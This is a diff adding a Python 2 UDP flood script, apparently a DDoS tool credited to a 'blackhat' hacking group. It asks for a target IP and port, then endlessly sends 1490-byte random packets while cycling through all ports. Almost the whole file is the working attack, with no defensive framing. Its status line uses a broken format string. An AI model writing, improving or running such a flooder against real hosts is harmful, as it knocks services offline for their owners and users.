@@ -1,0 +1,51 @@
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("figlet Mengirimkan Bug Bot")
+print "========================================================="
+print "= CREATOR SC   : ORGANIZATION MATA ELANG CYBER BLACKHAT ="
+print "= ORGANISASI   : HACKING DARK HAT YOGYAKARTA            ="
+print "= SC GITHUB    : https://github.com/ALUMINAUM/Ddos-Pro  ="
+print "========================================================="
+print
+ip = raw_input("IP ADDRESS TARGET WEB : ")
+port = input("PORT TARGET WEB      : ")
+
+os.system("clear")
+os.system("screenfetch -A CentOs")
+time.sleep(5)
+print "APAKAH KAMU YAKIN ?"
+yes = raw_input("YA / TIDAK : ")
+time.sleep(5)
+print "LOADING DATABASE.."
+time.sleep(3)
+print "DONE"
+time.sleep(4)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     hour = now.hour
+     minute = now.minute
+     day = now.day
+     sent = sent + 1
+     port = port + 1
+     print "%h    %m    %d   Menginstall %s Paket %s Ke Port %s"%(hour,minute,day,sent,ip,port)
+     if port == 65534:
+       port = 1
